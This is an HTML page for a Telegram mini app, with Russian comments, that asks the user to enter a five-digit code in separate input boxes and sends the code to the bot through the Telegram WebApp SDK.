<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ввод кода</title>
  <!-- Подключаем Telegram WebApp SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--tg-theme-bg-color, #ffffff);
      color: var(--tg-theme-text-color, #000000);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      box-sizing: border-box;
    }

    h2 {
      margin-bottom: 20px;
      font-size: 20px;
      text-align: center;
    }

    .code-container {
      display: flex;
      gap: 10px;
      margin-bottom: 30px;
    }

    .code-input {
      width: 45px;
      height: 55px;
      font-size: 24px;
      font-weight: bold;
      text-align: center;
      border: 2px solid var(--tg-theme-hint-color, #ccc);
      border-radius: 10px;
      background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
      color: var(--tg-theme-text-color, #000);
      outline: none;
      transition: border-color 0.2s;
    }

    .code-input:focus {
      border-color: var(--tg-theme-button-color, #2481cc);
    }
  </style>
</head>
<body>

  <h2>Введите 5-значный код</h2>

  <div class="code-container" id="otp-container">
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.expand(); // Разворачивает приложение на весь экран

    const inputs = document.querySelectorAll('.code-input');
    const mainButton = tg.MainButton;

    // Настройка главной кнопки Telegram
    mainButton.setText("ПОДТВЕРДИТЬ");
    mainButton.hide();

    inputs.forEach((input, index) => {
      // Автопереход на следующее поле при вводе
      input.addEventListener('input', (e) => {
        const val = e.target.value;
        if (val.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        checkFullCode();
      });

      // Обработка удаления (Backspace)
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    // Проверка, заполнено ли все поле
    function checkFullCode() {
      let code = "";
      inputs.forEach(input => code += input.value);

      if (code.length === 5 && /^\d+$/.test(code)) {
        mainButton.show();
      } else {
        mainButton.hide();
      }
    }

    // Отправка кода боту при нажатии на кнопку Telegram
    mainButton.onClick(() => {
      let code = "";
      inputs.forEach(input => code += input.value);

      // Отправляем данные обратно боту
      tg.sendData(JSON.stringify({ code: code }));
    });
  </script>
</body>
</html>
